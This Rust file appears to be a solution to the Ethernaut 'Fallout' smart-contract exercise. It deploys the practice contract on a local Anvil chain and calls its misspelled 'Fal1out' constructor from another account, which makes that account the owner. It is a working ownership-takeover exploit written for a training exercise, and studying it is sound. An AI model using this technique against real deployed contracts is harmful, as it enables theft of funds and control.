use alloy::providers::Provider;
use alloy::{providers::ProviderBuilder, rpc::types::TransactionRequest, sol};
use alloy_primitives::utils::parse_ether;
use eyre::Result;

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    Fallout,
    "../client/src/contracts/out/Fallout.sol/Fallout.json"
);

pub async fn solution_fallout() -> Result<()> {
    let rpc_url = "http://localhost:8545";
    let provider =
        ProviderBuilder::new().on_anvil_with_wallet_and_config(|anvil| anvil.fork(rpc_url))?;
    let accounts = provider.get_accounts().await?;

    let contract = Fallout::deploy(&provider).await?;
    println!("contract.address(): {}", contract.address());

    let contract_owner = contract.owner().call().await?;
    println!("contract_owner is {contract_owner}");

    let set_value_call = contract.Fal1out();
    let calldata = set_value_call.calldata().to_owned();
    let tx = TransactionRequest::default()
        .from(accounts[1])
        .to(contract.address().clone())
        .value(parse_ether("0.00009").unwrap())
        .input(calldata.into());
    let pending_tx = provider.send_transaction(tx).await?;
    println!("Transaction hash: {}", pending_tx.tx_hash());

    let owner = contract.owner().call().await?;
    println!("current owner: {}", owner);

    Ok(())
}
